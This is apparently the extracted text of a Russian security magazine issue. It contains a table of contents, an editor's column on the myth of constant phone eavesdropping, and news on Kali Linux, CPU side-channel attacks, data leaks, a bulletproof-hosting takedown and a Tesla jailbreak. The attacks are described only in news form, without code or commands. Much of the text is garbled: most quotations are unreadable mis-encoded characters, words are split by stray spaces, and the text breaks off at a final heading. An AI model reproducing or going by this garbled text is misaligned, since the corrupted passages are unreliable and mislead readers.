
            № 293
CONTENTS


    Большая неприватность
  Колонка главреда

    MEGANews
  Самые важ ные события в мире инфосека за август

     MikroTik Nightmare
  Пен тестим сетевое обо рудование MikroTik

     MikroTik Daymare
  Защища ем обо рудо вание MikroTik от хакер ских атак

     Caster Remix
  Исполь зуем виртуальный MikroTik для постэксплуатации Windows

    Змеиная анатомия
  Вскрываем и потрошим PyInstall

    Снимаем крючки
  Познаем анхукинг ntdll.dll

    Топ взлома
  Составля ем рейтинг самых популяр ных хакер ских атак

     InterstellarC2
  Разбираем последс твия заражения дроп пером PoshC2

    Как провести свое первое security-исследование
  Колонка Дениса Макрушина

    HTB Agile
  Ломаем PIN к веб-консоли Flask Werkzeug

    HTB Mailroom
  Эксплуатируем NoSQL-инъекцию через цепочку уязвимостей XSS и SSRF

    HTB Busqueda
  Эксплуатируем баг в приложении на Python, чтобы захватить веб-сервер

    HTB Cerberus
  Зах ватыва ем контроллер домена Windows через баг SAML SSO

    Врата ада
  Переписываем Hell’s Gate и обхо дим антивирус

    Scan2ban
  Защища ем периметр от ска неров и ботов

    Save Me
  Защища ем сети от спу финг-атак

    Титры
  Кто дела ет этот журнал
HEADER





         КОЛОНКА ГЛАВРЕДА





Всем известно, что каждый телефон неп-
рерыв но слушает все, что говорят вокруг,
и использует эти дан ные для показа рек-
ламы. Пос тойте, что?! Кто это ска зал и где
подтвержде ние?  Где  серьезные  иссле-       Андрей Письменный                                                                                      Главный редактор
дования? Доказатель ств  нет, но все же         apismenny@gmail.com
это крайне популярное мне ние. И неверо-
ятно вред ное.


Для начала оговорим ся: телефо ны при включен ном голосо вом ассистенте
дей ствительно неп рерывно «слушают» в ожи дании акти вирующей фразы.
Этот факт, видимо, и дал начало легенде о непрерывной прос лушке.
  При этом доказать, что слежки нет, тоже неп росто. Да, можно ковырять
трафик телефона (и это делается), но желающий вообразить какие-нибудь
безумные схе мы сок рытия вообразит их. А еще важ нее то, что людей, счи-
тающих телефон маленьким пре дательским стенографом, зачас тую и не
интересуют никакие технические под робнос ти.
   «Неоспоримое доказательство» прос лушки выг лядит так. Человек с кем-то
обсуждал, что хочет что-то купить. Скажем, плюмбус. А потом кру тит ленту
соцсети и видит там рек ламу как раз такого плюмбуса. При этом он точно
зна ет, что плюм бус в интернете не искал. Конечно, он решает, что телефон
записал и расшифро вал разговор про плюмбусы, а расшифровку послал
на базу. Это простое и логичное объяснение.
  Ре альность же нам ного интерес нее. Например, плюмбус мог потом поис-
кать собеседник и социальная сеть показала рек ламу всем его друзьям.
Вдруг они тоже захотят? Или сам разговор про плюб мусы был выз ван их
популярностью в этом сезоне, регионе, у людей опре деленного возраста
и пред почтений. В кон це концов, наш герой мог и рань ше видеть рекламу
плюмбусов, но обратил вни мание на нее только пос ле раз говора. Или еще
веселее: желание обза вестись плюмбусом изна чально и было спровоци-
ровано рек ламой.





  Тонкие настройки таргетинга позволяют нацелиться на самые раз ные
  интересы и их пересечение

Казалось бы, нем ного паранойи не помеша ет. Ну считают люди, что их
телефон — это все видящее око (точнее, всес лышащее ухо), подумаешь!
Может, и хорошо, что они наконец задумы вают ся о таких вещах. Да и в конце
концов, вдруг и прав да слушает? Но у таких рассужде ний есть неприятные
побоч ные эффекты.
  Перед лицом невидимой, но неумо лимой угрозы люди полностью теряют
волю к сопротив лению и начинают направо и налево раздавать раз решения
на слеж ку. Подумаешь, какое-то при ложение хочет доступ к адресной книге,
ведь телефон все вре мя слушает! Подума ешь, бонусная карта магазина —
это аналог сессион ных cookies, который поз воляет вес ти полную историю
покупок. Зато скидку дают... Да и все равно телефон все слушает! И так
далее.
  Получа ется, что уже нет смысла знать о реальных механизмах слежки.
К примеру, Gmail действи тельно собирает ста тис тику из писем — это широко
известный факт, отраженный в пользовательском соглашении. А счетчики
Google Analytics и кнопки шейринга в соцсетях — это маленькие тре керы,
раз бросанные по все му интерне ту, которые позволяют собирать точную кар-
тину перемещений пользователя в сети. Но все эти подробности слишком
сложны и мер кнут в сравнении с мифичес кой прос лушкой.
   Когда при нимаются законы, например против шифрования переписки,
реагирует на это лишь небольшая прос лой ка общественности. Остальные же
только пожимают плечами. Вроде бы не так тяжело убедить челове ка в том,
что защита его переписки — это важно и что это право сто ит отстаивать.
Но дело усложняется, когда он давно не верит, что его переписка в реальнос-
ти была защище на и никто не мог получить к ней дос туп.
   Когда у людей нет веры в при ват ность в принципе, то ее оказывается
сложно продать. Как она может быть конкурентным пре имущес твом, если,
что бы ни делал разработчик, он все равно под подоз рени ем? Хуже того,
какой-то про изводитель телефо нов может взять и решить, что раз прослушка
считается нормой, то можно ее врубить и никто не расстроится.
  Именно поэтому наше дело — раз бирать ся в деталях и стараться знать
обо всех частных слу чаях и исклю чениях. А самое главное — никогда
не поощрять образ мыс лей, который обесценивает защиту личных данных
под видом нигилизма или особой осве дом ленности.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: выш ла новая версия Kali Linux, утекли данные
пользовате лей  «ЛитРес»  и   Duolingo,  фай лообменник
Anonles зак рылся из-за постоянных зло употреблений, уче-
ные соз дали сра зу три side-channel-атаки на сов ременные
про цессоры, исследова тели джей лбрей кнули Tesla и раз-
блокиро вали плат ные функции, а так же другие интересные
события пос ледне го месяца лета.
KALI LINUX ПОЛУЧИЛА
ДЕВЯТЬ НОВЫХ
ИНСТРУМЕНТОВ





Разработ чики Oﬀensive Security пред ставили Kali Linux 2023.3, третью версию
дистри бути ва в 2023 году. Новинка уже дос тупна для загрузки и содер жит
девять новых инструмен тов, а также ряд улуч шений, включая модернизиро-
ванную  внутреннюю  инфраструк туру, обновлен ные  Kali  Autopilot и  Kali
NetHunter.
  В этом выпуске появилось не так много новых функций, а большинство
изме нений были внутренними, нап равлен ными на повышение общей надеж-
ности проекта и его оптимизацию.
   Так, по сло вам разработ чиков, в этом выпуске они в основном сосредото-
чились на инфраструктуре ОС, что бы она соот ветствовала Debian 12, вышед-
шему летом текущего года.

      «Ñ ðåëèçîì Debian 12, êîòîðûé âûøåë ðàíåå ýòèì ëåòîì, ìû âîñ ïîëü-
      çîâàëèñü âîç ìîæíîñòüþ ïåðåðà áîòàòü, ïåðåï ðîåê òèðîâàòü è ïåðåñ-«
      òðîèòü íàøó èíôðàñòðóê òóðó. Ýòî î÷åíü ìàñ øòàáíàÿ ðàáîòà, è íå ñòî-
      èò óäèâ ëÿòüñÿ òîìó, ÷òî îíà åùå íå çàâåð øåíà.
     Èìåííî íà ýòîì ìû ñîñ ðåäîòî÷èëèñü â ýòîì ðåëèç öèê ëå (à òàê æå,
       ê ñîæàëå íèþ, â ñëå äóþùåì). Íàäå åìñÿ, ÷òî áîëüøàÿ ÷àñòü ðàáîòû
      áóäåò çàâåð øåíà ê êîíöó ãîäà (÷òîáû ìû ìîãëè âåð íóòüñÿ ê òîìó, ÷òî
      ïîëó÷à åòñÿ ó íàñ ëó÷ øå âñå ãî!)», — ñîîáùàþò àâòîðû Kali.                »
Нев зирая на эти заяв ления раз работчиков, Kali Linux 2023.3 получи ла девять
новых инс трумен тов:
 • Calico — натив ный облачный нетворкинг и сетевая безопас ность;
 • cri-tools — CLI и инструменты валидации для kubelet Container Runtime
   Interface;
 • Hubble —  наблюдение  за  сетью,  сервисами  и  безопас ностью
   для Kubernetes с использовани ем eBPF;
 • ImHex — hex-редактор для реверс-инженеров, программис тов и людей,
   «которые ценят свои глаза при работе в три часа ночи»;
 • kustomize — кастомизация конфигура ций Kubernetes YAML;
 • Rekono — платформа авто матизации, объединяющая раз личные хакер-
   ские инструменты для пентестинга;
 • rz-ghidra — глубокая интеграция деком пилято ра Ghidra и дизассемблера
   Sleigh для Rizin;
 • unblob — извле чение файлов из контей неров любых форматов;
 •  Villain —  C2-фрей мворк,  который  может  работать  с  нес колькими
   реверс-шеллами и рас ширять их фун кци ональность.

Кро ме того, в начале 2023 года разработчики представили фреймворк
для автоматичес ких атак Kali Autopilot. Теперь команда сооб щает, что продол-
жает работу над ним, добавляя и изме няя функциональность на основе отзы-
вов пользователей:


      «Çà ïîñ ëåäíèå øåñòü ìåñÿöåâ ýòîò èíñ òðó ìåíò ïðîøåë áîëüøîé ïóòü,
      è ìû íå ïëà íèðó åì ñíèæàòü òåì ïû. Êàê âñåãäà, åãî ôîð ìèðó åò ñîîá-«
     ùåñ òâî; èäåè, âîç ìîæíîñ òè è íàï ðàâëå íèÿ ðàç âèòèÿ ìîãóò áûòü ïðåä-
      ñòàâ ëåíû è ñôîð ìèðîâà íû  âàìè.  Åñëè âû  ðàç ðàáîòà ëè  ñêðèï òû
      äëÿ àòàê íà óÿç âèìûå ìàøèíû, ìû áóäåì ðàäû ðàç ìåñòèòü èõ â íàøåì
        Kali Purple Hub».                »





Также отме чает ся, что Kali NetHunter получил дополнительные под держи-
ваемые мобильные ядра, вклю чая Nothing Phone (1) для Android 12 (Snow
Cone) и 13 (Tiramisu), а также Samsung Galaxy A7 для LineageOS 18.


НА 230% БОЛЬШЕ НЕЛЕГАЛЬНОГО РОССИЙСКОГО
СОФТА
По данным СМИ, объем нелегального российского ПО вырос более чем в два раза (на 230%)
по сравнению с прошлым годом, так как пираты переключились на рос сий ские про дук ты. Нап-
ример, на одном из торрент-тре керов количество скачиваний пират ской версии Astra Linux сос-
тавило 1514 раз, а Windows 11 за аналогичный пери од — менее 300.

В  Рос комнадзоре  подтверждают,  что  аудитория  пиратских  ресур сов  в  целом  рас тет:
с начала 2023 года по линии нарушений авторских прав было удалено или заблокировано око-
ло 624 000 матери алов, тогда как за аналогичный период 2022 года таких материалов удалено
или заблокировано 291 000.

СРАЗУ ТРИ АТАКИ
УГРОЖАЮТ
СОВРЕМЕННЫМ
ПРОЦЕССОРАМ





Август оказался богат на «процессорные» side-channel-атаки, которые пред-
став ляют угрозу поч ти для всех современ ных CPU.
  Первой  из  них  стала проблема  Collide+Power  (CVE-2023-20583),
о которой рас сказали ученые, ранее учас твовавшие в обнаруже нии нашумев-
ших проблем Spectre и Meltdown.
  Новая side-channel-атака может при вес ти к утечке данных, и ее сравнива-
ют с проблемой Meltdown, отно ся к уяз вимостям типа Microarchitectural Data
Sampling (MDS). По сути, Collide+Power представляет собой уни версальную
софтверную ата ку, которая при менима к любому приложению, любому типу
данных и работа ет против устрой ств на базе процессоров Intel, AMD и ARM.
   Collide+Power основывается на ана лизе энер гопотребления про цессора
для выяв ления содержимого кеш-памяти процессора. Атака может, к при-
меру, помочь раскрыть клю чи шифрования, если злоумышленник имеет пос-
тоян ный дос туп к оборудованию жертвы или к сре де облачных вычис лений,
которая пре дос тавляет обо рудование разным тенантам.
  Иссле дователи объяснили, что Collide+Power сложно наз вать фактической
уязвимостью. По сути, атака просто зло упот ребляет тем, что некоторые ком-
поненты ЦП предназна чены для обмена дан ными из разных защищенных
областей. Зло умышленник может использовать эти общие компоненты, чтобы
объ еди нить свои данные с данными пользовательских при ложе ний. Для этого
злоумышленник изме ряет энер гопотребление процессора, изме няя подкон-
трольные ему данные, и выявляет данные, связан ные с пользовательскими
при ложе ниями.
   Вто рая проблема, разработанная сотрудником компании Google, — про-
цессорная  атака  для  свежей  уязвимости  Downfall  (CVE-2022-40982),
которая представ ляет угрозу для нес кольких семейств микропроцессоров
Intel. Эта проблема тоже поз воляет похищать пароли, ключи шифрования
и лич ные данные (нап ример, электронные письма, сообщения или банков-
скую информацию) пользователей.
   Downfall представляет собой side-channel-ата ку и использует баг типа
transient execution. Такие ата ки опасны для всех про цессоров Intel на мик-
роар хитектурах от Skylake до Ice Lake. Экс плуатируя уязвимость, злоумыш-
ленник получает возможность извле кать конфиденциальную информацию,
защищенную с помощью Software Guard eXtensions (SGX), аппарат ного шиф-
рования Intel, которое обычно отделяет код и дан ные в памяти от софта в сис-
теме.
  Для осущест вле ния  ата ки  Downfall тре бует ся,  чтобы злоумышленник
находился в том же физичес ком ядре процессора, что и жертва, но это обес-
печивается современной моделью shared-вычислений. При этом локальная
программа, нап ример вредоносное ПО, в теории тоже может использовать
уязвимость для кражи конфиденциальной информации.
   Третьей спе кулятив ной проблемой этого месяца стала атака Inception
(CVE-2023-20569), названная в честь одноименного филь ма Кристофера
Нолана и представляющая собой проблему типа transient execution.
   Эта side-channel-атака, созданная груп пой специалистов из Швейцарской
высшей тех нической шко лы Цюриха, может исполь зоваться против любых
про цессоров AMD Zen (от Zen 1 до Zen 4), включая последние модели.
Inception также может при вести к утечке данных вроде паролей и клю чей
шиф рования.
  Для соз дания Inception эксперты объединили уже известную проб лему
Phantom speculation (CVE-2022-23825) с новой ата кой, которой дали наз-
вание Training in Transient Execution (TTE).

      «Êàê â îäíîèìåííîì ôèëüìå, „Íà÷àëî“ (Inception) çàê ëàäûâà åò â ÖÏ
      „èäåþ“, ïîêà òîò â íåêîòîðîì ñìûñ ëå „ñïèò“, âûíóæäàÿ åãî ñîâåð øàòü«
      íåï ðàâèëüíûå äåéñòâèÿ, îñíîâàííûå íà ÿêîáû ñàìîñ òîÿòåëüíî ïðè-
      äóìàííîì îïû òå. Èñïîëüçóÿ ýòîò ïîäõîä, Inception çàõâàòûâà åò âðå-
     ìåííûé ïîòîê óïðàâëå íèÿ èíñ òðóê öèÿìè âîç âðà òà íà âñåõ ïðîöåñ ñîðàõ
     AMD Zen», — îáúÿñíèëè èññëå äîâà òåëè.                »
По сути, эта проб лема (она получила иден тифика тор CVE-2023-20569) пред-
став ляет собой новый тип атак, который позволя ет заставить ЦП поверить
в  то,  что инструк ция XOR является инструк цией рекурсивного вызова.
Это приводит к перепол нению буфера сте ка возврата целевым адресом, кон-
тролируемым зло умышленни ком, и поз воляет сливать произвольные данные
из непривилегирован ных процессов, запущенных на любом процессоре AMD
Zen.


НИКАКИХ АТАК НА «ГОСУСЛУГИ»





Выс тупая на сам мите «Россия — Африка», гендиректор ком пании «Рос телеком-Солар» Игорь
Ляпунов сооб щил, что за пос ледние полтора года не было ни одной кибератаки на «Госуслуги».
   Напом ним, что специалисты «Рос телекома» отве чают за безопас ность портала «Госуслуги»
и за работу ЕСИА (Единой системы идентификации и аутен тифика ции).

         «В прошлом году, в первые месяцы начала СВО, мы наблюдали эффект, ког-→       да на биржах в даркнете распродавались хакер ские ресурсы для атак на тер-
      риторию Рос сии.  Конеч но,  „Госус луги“  явля ются  колос сальным  магнитом
       для хакеров. Это большой вызов. За эти 1,5 года ни одной успешной кибера-
       таки и оста новки наших государственных сер висов не было», — заявил Ляпунов.

УТЕКЛИ ДАННЫЕ
DUOLINGO
И «ЛИТРЕС»





Сре ди круп ных уте чек данных на российском рынке в августе можно было
выделить два инци дента: слив дан ных пользователей сер виса электронных
книг «Лит Рес» и публикацию информации о 2,6 мил лиона пользователей
Duolingo.
  В случае «ЛитРес» хакеры выложили в открытый дос туп данные поль-
зователей сервиса. По информации аналитиков Data Leakage & Breach
Intelligence, ответственность за эту утеч ку лежит на тех же злоумышленни ках,
которые раньше сли ли в сеть данные «Сбер Логистики», образовательного
пор тала GeekBrains, службы доставки Delivery Club и многих других компаний.
   Дамп,  связанный  с  «Лит Рес»,  насчитыва ет  677  Мбайт  и  содер-
жит 3 083 408 строк, но хакеры утвержда ют, что в пол ном дампе боль-
ше 97 миллионов строк. В откры тый доступ уже попали:
 • имя, фамилия (не для всех);
 • email-адре са (590 тысяч уникальных адресов);
 • хе шированные пароли (SHA-1 без соли).

Представитель «ЛитРес» подтвердил утеч ку дан ных клиентов, под черкнув, что
платеж ная информация пользователей не пострадала. В компании сооб-
щили, что уже занимаются расследованием случив шегося.
  Слив информации о 2,6 миллиона пользователей Duolingo, произошед-
ший в кон це месяца, выг лядит ина че. Дело в том, что на хакер ском форуме
была опубликована информация, соб ранная при помощи скра пинга. Дамп
включал обще дос тупные логины и име на пользователей, а также приват ную
информацию, в том числе email-адреса и внутренние данные, связанные
с сервисом Duolingo.
   Хо тя нас тоящее имя и логин являются обще дос тупной информацией
и частью поль зовательского профиля Duolingo, утечка email-адре сов пред-
став ляет собой более серьезную проб лему, так как поз воляет исполь зовать
общедос тупные данные в ата ках.
  Интересно, что в начале года этот же набор данных продавали в дар кнете
за 1500 долларов США, а теперь дамп опуб ликова ли на новой версии хакер-
ского форума Breached, и хакеры оценили его все го в восемь кредитов (внут-
ренняя валюта сай та, пример но 2,13 доллара США).





                    Дан ные продают за 1500 дол ларов

Су дя по все му, данные были соб раны с помощью откры того API, информация
о котором циркулирует в сети как минимум с марта 2023 года. Причем
ИБ-спе циалисты давно предупреждали об этой проблеме и докумен тировали
воз можные спо собы ее эксплуата ции.
  Фак тичес ки этот API позволяет отправлять username и получать выход ные
данные JSON, содержащие информацию из общедоступного про филя поль-
зователя. Также можно ввес ти адрес электрон ной почты и узнать, связан ли
он с действующей учет ной записью Duolingo. Это поз волило скраперам «про-
верить» миллионы email-адресов, которые фигурировали в других утеч ках
данных, и связать их с конкретными учетными запися ми.
  По данным СМИ, злополучный API открыт до сих пор, даже после множес-
тва пуб личных предуп реждений от экспер тов и скра пинга данных.


ЗА ГОД ИИ СОЗДАЛ БОЛЬШЕ ИЗОБРАЖЕНИЙ, ЧЕМ
ФОТОГРАФЫ ЗА 150 ЛЕТ

Компания Everypixel Group сообщает, что в пос ледний год количество соз данно го ИИ контента
в сети неук лонно растет и уже мож но говорить о сво еоб разных рекордах. Так, за пос ледние
пятнадцать месяцев популярные ИИ-решения (Midjourney, Stable Diffusion, DALL-E 2 и Adobe
Firey) сгенерирова ли по зап росам пользователей более 15 мил лиардов изображений.





Для сравнения исследователи подсчитали, что фотографам потребовалось почти 150 лет, про-
шед ших с момента первой фотог рафии, сде лан ной в 1826 году, что бы дос тичь отметки
в 15 миллиар дов в 1975 году.





После запус ка DALL-E 2 люди создают в сред нем 34 миллиона изображений в день.

При этом около 80% изображений  (12,5 мил лиар да) были созданы с использованием
моделей, сервисов, плат форм и приложений на осно ве Stable Diffusion, который име ет откры-
тый исходный код.





                                     Продолжение статьи →
← Начало статьи
 XIAOMI БЛОКИРУЕТ
 УСТАНОВКУ
 TELEGRAM В КИТАЕ





  Об наружилось, что теперь уста новка Telegram на устройства Xiaomi блокиру-
   ется с помощью MIUI. В Китае Xiaomi помеча ет Telegram как опасное при-
  ложение и блокирует из сооб ражений безопас ности.
    Еще в 2022 году в MIUI добавили функциональ ность, благода ря которой
  ОС получила возможность помечать и блокировать запуск потенциально вре-
  доносных приложений на устройствах ком пании. Эта функция, офи циально
  предназначенная для защиты от мошенничес тва и спам-звонков, прак тически
  сра зу подвергалась кри тике, так как пользователи заподозрили, что это заву-
  алированная попыт ка Xiaomi отсле живать дей ствия пользователей, а также
   сотрудни чать с китайскими властями, под вергая цензуре конкретные при-
  ложения.
     Эти подозрения подкреп лялись тем, что MIUI начала блокировать при-
  ложения, которые поз воляли пользователям вносить глубокие изменения
   в сетевые настрой ки устройств.
     Если приложе ние счи тается вредонос ным или опасным, MIUI пыта ется
  удалить его с устройства и заб локиро вать уста нов ку. И недавно MIUI стала
  помечать как опасное при ложение Telegram и блокиро вать его уста нов ку
   в Китае.





  Сог ласно сооб щени ям пользователей, если MIUI обнаруживает мессенджер,
  появляет ся пре дуп режде ние:


        «Ïðèëîæå íèå íå ïðîø ëî ïðîâåð êó áåçîïàñ íîñòè Xiaomi. Ýòî ïðèëîæå-
        íèå ÿâëÿåòñÿ ìîøåííè÷åñ êèì, è åãî èñïîëüçîâàíèå ìîæåò ïðèâåñ òè «
          ê òàêèì ðèñ êàì, êàê ìîøåííè÷åñ êèå ñïèñàíèÿ èëè íåîáîñ íîâàííûå
         òðà òû. Â  öåëÿõ  áåçîïàñ íîñòè  ðåêîìåíäóåòñÿ  àêòèâèðîâàòü ìåðû
        çàùèòû, ÷òîáû îáåñ ïå÷èòü áåçîïàñ íîñòü è çàùèòèòüñÿ îò îïàñ íûõ
        ïðèëîæå íèé».                 »
  Ис торически китайские влас ти стремились ввес ти ограничения и пря мые зап-
  реты на работу мно гих крупных платформ, включая Twitter, WhatsApp и Google.
   Также недав но Китай обра тил свое внимание на приложе ния, которые
  облегчают обще ние или обмен кон тентом, — к их числу относит ся и Telegram.


 ФЕЙКОВ СТАЛО НА 34% БОЛЬШЕ

   Специалисты «РТК-Солар» под считали, что в первом полугодии 2023 года количество фаль-
   шивых приложений, выда ющих себя за популярные сервисы, увеличилось на 34%. В среднем
   такие подделки «живут» в магазинах приложений 62 дня.

   Чаще других от таких дей ствий злоумышленников страдают бан ковские и криптовалютные
   приложения, а для доставки вре доносного кода на устройства используются раз нообразные
   иг ровые при ложения.

 ХОСТИНГ LOLEK
 ЗАКРЫЛИ





  Правоохранительные органы закрыли известный «пуленепробиваемый» хос-
   тинг Lolek (lolekhosted[.]net), арестовали пять его админис траторов и кон-
  фисковали серверы, которые якобы использовались в атаках вымогателя
   Netwalker.
   Ши роко известный провайдер «пуленеп робива емого» хостинга работал
  с 2009 года. Его упо мина ния час то можно встретить в статьях об аноним ных
  хостинговых платформах, и известно, что хостинг базировался в Великоб-
   ритании, а его дата-центры размещались в странах Европы.
     «Пуленеп робиваемые» хостинг-провай деры, как правило, закрывают глаза
  на размеща емый клиентами контент и обещают сох ранить их анонимность.
  Подобные компании извес тны тем, что предос тавляют злоумышленни кам IP-
  адреса, сер веры и домены для распространения вре донос ных программ,
  формирования ботнетов и выполнения других задач, связанных с мошен-
  ничеством и кибератака ми.
      Lolek рек ламиро вался как «100%-но конфиденциальный хостинг» с пол-
  ным отсутстви ем логов, то есть его создатели уверяли, что не фик сиру ют
  на сво их серверах и сетевом обо рудовании никакую активность, которая мог-
  ла бы исполь зовать ся для обвинения клиентов в преступле ниях.
     Как сооб щили Европол и Министерс тво юсти ции США, в Польше были
  арестованы пять адми нистра торов сервиса, а все серверы Lolek конфиско-
   ваны.
     Ев ропол  заявил,  что  Lolek был  закрыт, поскольку киберпреступни ки
  использовали  его  ресурсы  для  организа ции  DDoS-атак,  проведе ния
  спам-кампаний, распространения инфости леров, раз мещения управляющих
  серверов и под дельных интернет-магази нов.
    Ми нистерство юстиции США, в свою оче редь, сообщило, что в админис-
  трировании Lolek обви няют гражданина Польши по име ни Артур Кароль Гра-
  бовски (Artur Karol Grabowski). Хотя в настоящее время неясно, был ли Гра-
  бовски одним из администраторов  хостинга, арестованных  в Польше,
  Минюст утверждает, что он содей ствовал киберпреступности, позволяя кли-
  ентам Lolek регистри роваться под вымыш ленными именами, часто менять IP-
  адреса сер веров, а также уведомлял клиентов о юри дических запросах в их
  отношении.
     Кроме того, считается, что Грабовски якобы помогал уже прекратившей
  свое существо вание вымогатель ской группиров ке Netwalker, которая арен-
  довала у Lolek сер веры, использовавшиеся более чем в 50 атаках (для взло-
  ма сетей, хранения похищен ных дан ных и хакерских инструментов).
    В настоящее вре мя Грабовски предъявлены обви нения в сговоре с целью
  совершения компь ютерного мошен ничес тва, сго воре с целью совершения
  мошен ничества с использованием электронных средств связи, а  также
   в отмывании денег в меж дународных мас штабах. В случае признания винов-
  ным по всем пунктам обви нения ему гро зит до 45 лет лишения свободы.


  БЬЁРН СТРАУСТРУП ДАЕТ СОВЕТЫ РАЗРАБОТЧИКАМ





   Создатель языка C++, автор мно жес тва книг и профессор компь ютерных наук в Колумбийском
   университете Бьёрн Страуструп (Bjarne Stroustrup) дал интервью Honeypot.io, в котором, нап-
   ример, рас ска зал, что стал программистом по ошиб ке, полагая, что записывается на курс
   прикладной математики (на самом деле это был курс по информатике).
      По просьбе интервьюеров Страуструп дал нес колько советов нынеш нему поколению прог-
   раммис тов.

             «Труд но давать советы. Как минимум так же труд но, как и их принимать. →           Не переусердствуйте со специализацией. Не будьте слишком уве рены в том,
           что вам извес тно будущее. Будьте гиб кими и помните, что карьера и работа —
          это долгосрочная перспектива. Слишком много молодых людей думают, что
          могут что-то оптимизировать, а потом обнаруживают, что потратили пару лет
         или больше на специализацию, которая, веро ятно, была не совсем правильной.
        И в процессе работы они выгорают, потому что не уделяли достаточно времени
         друж бе и жиз ни вне компь ютера.
            Нельзя прос то кодить. Нужно также работать с культурой и спо собами
         выражения идей. То есть я никогда не жалел о времени, потраченном на исто-
        рию и математику. Математика отта чивает ваш ум, исто рия дает вам представ-
          ление о ваших огра ничениях и о том, что про исходит в мире. И поэтому не будь-
           те слишком уверены. Не спешите, старайтесь вести более сбалансированную
         жизнь и будьте готовы исполь зовать представив шиеся возможнос ти».


   Ссы лаясь на свой собс твенный опыт, Стра уструп говорит, что необ ходимо обладать широким
   набором навыков, чтобы мочь использовать различные возможнос ти, когда они появляются:

            «Я занимал ся клас сичес кой информатикой, ком пилято рами, занимал ся нес- →          коль кими языками... Думаю, тог да я знал около двух десятков. Я занимался
          архитектурой машин, операционными системами. И этот набор навыков оказал-
          ся полезным».

 ДЖЕЙЛБРЕЙК TESLA
 РАЗБЛОКИРОВАЛ
 ПЛАТНЫЕ ФУНКЦИИ





  Ис сле дователи из Берлинского  технического университета разработали
  метод джей лбрейка инфотей нмент-систем на базе процессоров AMD. Такие
  системы исполь зуются во всех последних моделях автомобилей  Tesla,
  и иссле дова тели получили возможность запускать на них любое ПО, а также
  раз бло киро вать плат ные фун кции автомобилей.
     Соз данная иссле дователя ми атака позволяет извлечь уникальный ключ
  RSA, привязанный к железу (Tesla использует его для аутентификации авто-
  мобиля в сво ей сервисной сети), а также акти вировать программно заб-
  локированные функции, вклю чая подог рев сидений и Acceleration Boost,
  за которые владельцы Tesla обычно дол жны платить отдельно. Осо бо отме-
   чается, что разблокировать таким способом фун кцию Full Self-Driving (FSD,
  зна мени тый «автопилот» Tesla) не получится.
     Эксперты обнаружи ли, что человек, имеющий физический доступ к пла те
   Infotainment and Connectivity ECU (ICE) автомобиля, может использовать из-
  вестную атаку против AMD Secure Processor (ASP), на котором стро ится блок
  управле ния инфотей нмент-системами MCU-Z.
     Взло мать информационно-развлекательную сис тему удалось, опираясь
  на упомянутое прошлое исследова ние, которое обна руживало воз можность
  внедрения ошибок и извлечения сек ретов. Так как инфотей нмент-система
   Tesla осно вана на уязвимом процес соре AMD Zen 1, использование ранее
  обнаруженных багов помог ло осуществить ее джей лбрейк.


        «Â íàñ òîÿùåå âðå ìÿ ðåàëèçîâàòü íàøó àòà êó ñìîãóò ëþäè, êîòîðûå
        îáëà äàþò îïðå äåëåííûìè ïîç íàíèÿìè â îáëàñòè ýëåê òðîííîãî îáî- «
         ðóäîâàíèÿ, óìå þò îáðà ùàòüñÿ ñ ïàÿëüíèêîì è ìîãóò ïðèîáðåñòè
        äîïîëíèòåëüíîå îáîðóäîâàíèå ñòîèìîñòüþ ïðèìåð íî 100 äîëëàðîâ, —
         ðàñ ñêà çûâà þò  ýêñïåð òû. — Ìû  ðåêîìåíäóåì  ïëà òó  Teensy  4.0,
         êîòîðóþ ëåãêî èñïîëüçîâàòü äëÿ àòàê voltage glitching ñ íàøåé îïåí-
        ñîð ñíîé  ïðîøèâ êîé.  Òàê æå  ïîòðåáó åòñÿ  ïðîãðàììà òîð  SPI-Flash
        è ëîãè÷åñ êèé àíà ëèçà òîð, êîòîðûé ìîæåò ïîìî÷ü â îòëàäêå àòà êè».                 »
  Упомянутая тех ника voltage glitching, также известная как внедрение ошибок,
  позволя ет получить root-доступ и запустить про извольное ПО на MCU-Z
  для раз блокировки некоторых платных функций авто. Более того, исследова-
   тели утверждают, что полученный таким спо собом доступ будет практически
  необратимым.

         «Ïîëó÷åííûå íàìè root-ïðà âà ïîç âîëÿþò âíîñèòü ïðîèçâîëüíûå èçìå-
         íåíèÿ â  Linux, êîòîðûå âûäåð æàò ïåðåçàãðóçêè è îáíîâëå íèÿ», — «
         ãîâîðÿò àâòîðû àòà êè.                 »
  Кро ме того, джейлбрейк позволяет извлечь защищенный TPM ключ аттеста-
   ции, который Tesla использует для аутентифика ции автомоби ля и проверки
  целос тности его аппа ратной сос тавляющей, и перенести его на другой авто-
  мобиль. Иссле дователи объясняют, что это, нап ример, может помочь исполь-
   зовать авто мобиль в неподдерживаемых странах или выпол нить самос-
   тоятельный ремонт. Однако это также может помочь злоумышленнику выдать
  свое авто за чье-то другое.
    Иссле дователи отме тили, что ата ку, скорее всего, можно пре образовать
   в  готовый  «про дукт»,  вро де  мод-чипа,  который  будет  использоваться
  для джейлбрей ка по принципу plug-and-play. Сами эксперты чем-то подобным
  занимать ся не планируют, так как с юри дичес кой и экономической точки зре-
  ния это была бы «весьма сом нительная бизнес-модель».
     Авторы джейлбрей ка уведомили автопро изводителя о сво их выводах,
  и ком пания уже работа ет над устра нением обнаружен ных проблем.

          «Tesla ñîîáùèëà íàì, ÷òî íàø PoC äëÿ âêëþ ÷åíèÿ îáîãðåâà çàäíèõ
        ñèäåíèé îïèðàåòñÿ íà ñòà ðóþ âåð ñèþ ïðîøèâ êè. Â áîëåå íîâûõ âåð- «
         ñèÿõ ïðîøèâ êè îáíîâëå íèå ýòîãî ýëå ìåíòà êîíôèãóðà öèè âîç ìîæíî
         òîëüêî ïðè íàëè÷èè äåéñòâèòåëüíîé ïîä ïèñè Tesla (ïðîâåðåííîé/ïîä-
        òâåðæäåííîé øëþ çîì). Òàêèì îáðà çîì, õîòÿ íàøè àòà êè çàëîæèëè
        âàæíóþ îñíîâó äëÿ ýêñïå ðèìåíòîâ ñ ñèñ òåìîé â öåëîì, äëÿ âêëþ ÷åíèÿ
         îáîãðåâà çàä íèõ ñèäåíèé èëè ëþáîé äðó ãîé çàáëîêèðîâàííîé ôóíêöèè
         ïîòðåáó åòñÿ åùå îäèí ïðîãðàì ìíûé èëè àïïà ðàòíûé ýêñ ïëîèò è àòà êà
         íà øëþç».                 »
  Тем не менее атака на извлечение ключа все еще работает даже с новей шей
  про шив кой Tesla.


 ДАННЫЕ УТЕКАЮТ В 40 РАЗ ЧАЩЕ

